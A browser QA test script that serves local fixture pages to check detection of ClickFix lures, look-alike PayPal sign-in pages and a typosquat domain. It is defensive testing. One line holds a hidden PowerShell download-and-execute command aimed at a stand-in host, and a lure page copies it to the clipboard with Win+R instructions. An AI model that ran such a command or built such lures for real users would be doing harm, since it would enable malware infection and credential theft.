// Real app, local fixture only: ClickFix guard + look-alike sign-in set a caution on the tab; a look-alike address is stopped with the warning page; the switch turns it off.
//   node qa/privacy-plus/page-risk-app.mjs      One instance, at most 6 tabs, closed in finally.
import fs from 'node:fs/promises';
import http from 'node:http';
import {launch, sleep} from '../extension-matrix/lib.mjs';
const CMD = 'powershell -w hidden -c "iex (irm http://evil.example/a)"';
const pages = {
  '/lure': `<!doctype html><title>Checking your browser</title><body><h1>Verify you are human</h1><p>Press Win+R, paste with Ctrl+V and press Enter to fix the browser error.</p><button id=b>I am not a robot</button><script>document.getElementById('b').onclick=()=>navigator.clipboard.writeText(${JSON.stringify(CMD)}).then(()=>{window.copied=true},e=>{window.copied=e.name});</script>`,
  '/login': '<!doctype html><title>Sign in to your PayPal account</title><body><h1>PayPal</h1><form><input name=u><input type=password name=p></form>',
  '/ok': '<!doctype html><title>Acme sign in</title><body><h1>Acme</h1><form><input name=u><input type=password name=p></form>'
};
const server = http.createServer((req, res) => { const body = pages[req.url.split('?')[0]]; res.statusCode = body ? 200 : 404; res.setHeader('content-type', 'text/html'); res.end(body || 'nf'); });
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve)); const base = `http://127.0.0.1:${server.address().port}`;
const app = await launch('j-page-risk', {args: ['--host-resolver-rules=MAP *.test 127.0.0.1']}); const out = {};
const open = async (url, wait = 4500) => { await app.act({type: 'tab.new', url}); await sleep(wait); const tab = (await app.state()).tabs.at(-1); return {risk: tab.risk || null, error: tab.error || null, url: tab.url.slice(0, 60)}; };
try {
  await sleep(2000);
  out.ok = await open(base + '/ok');
  const named = base.replace('127.0.0.1', 'secure-sign-in.test'); out.login = await open(named + '/login');
  out.lure = await open(base + '/lure', 3000);
  const page = app.web(base + '/lure'); if (page) { await page.evaluate(() => document.getElementById('b').click()); await sleep(800); out.lureClickResult = await page.evaluate(() => window.copied); const after = (await app.state()).tabs.at(-1); out.lureRiskAfterClick = after.risk || null; }
  out.lookalike = await open('http://paypa1.com/', 3500); out.lookalikeTitle = await app.ui.evaluate(() => document.querySelector('.ne-title')?.textContent); out.lookalikeMessage = await app.ui.evaluate(() => document.querySelector('.ne-message')?.textContent);
  await app.ui.screenshot({path: 'qa/artifacts/page-risk-lookalike.png'});
  await app.svc({type: 'antitracking.set', patch: {pageWarnings: false}}); out.switchedOff = await open(named + '/login?again');
  await app.svc({type: 'antitracking.set', patch: {pageWarnings: true}});
} catch (error) { out.error = String(error.stack || error).slice(0, 500); }
finally { await fs.mkdir('qa/artifacts', {recursive: true}); await fs.writeFile('qa/artifacts/page-risk-app.json', JSON.stringify(out, null, 1)); console.log(JSON.stringify(out, null, 1)); await app.close(); server.close(); process.exit(0); }
